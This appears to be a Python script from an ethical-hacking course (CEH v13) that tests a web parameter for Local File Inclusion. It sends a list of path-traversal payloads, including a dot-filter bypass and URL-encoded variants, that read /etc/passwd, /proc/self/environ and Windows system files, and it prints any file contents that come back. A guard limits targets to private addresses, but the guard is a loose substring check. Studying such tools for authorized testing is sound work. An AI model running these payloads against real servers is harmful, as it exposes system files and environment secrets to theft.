#!/usr/bin/env python3
# LAB-ONLY: LFI (Local File Inclusion) Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/lfi.php?file="  # YOUR lab URL
LAB_LFI_TRAVERSAL_PAYLOADS = [
    "/etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",  # Bypass dot-filter
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",  # URL-encoded
    "/etc/hostname",
    "/proc/self/environ"
]
LAB_WINDOWS_LFI = [
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "../../Windows/win.ini"
]
LAB_CHECK_STR_LINUX = "root:x:"  # Check for /etc/passwd content
LAB_CHECK_STR_WINDOWS = "[extensions]"  # Check for win.ini
# -----------------------------------------------------------------------------------

def test_lfi(url, payload, check_str):
    full_url = f"{url}{requests.utils.quote(payload)}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        if check_str.lower() in response.text.lower():
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Local File Inclusion (LFI) Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("Testing Linux LFI payloads first...")
    print("-"*80)
    for payload in LAB_LFI_TRAVERSAL_PAYLOADS:
        vulnerable, resp = test_lfi(LAB_TARGET_URL, payload, LAB_CHECK_STR_LINUX)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<50} â†’ {status}")
        if vulnerable:
            print(f"   Snippet: {resp[:250]}...")
    print("\nTesting Windows LFI payloads...")
    for payload in LAB_WINDOWS_LFI:
        vulnerable, resp = test_lfi(LAB_TARGET_URL, payload, LAB_CHECK_STR_WINDOWS)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Payload: {payload:<50} â†’ {status}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()
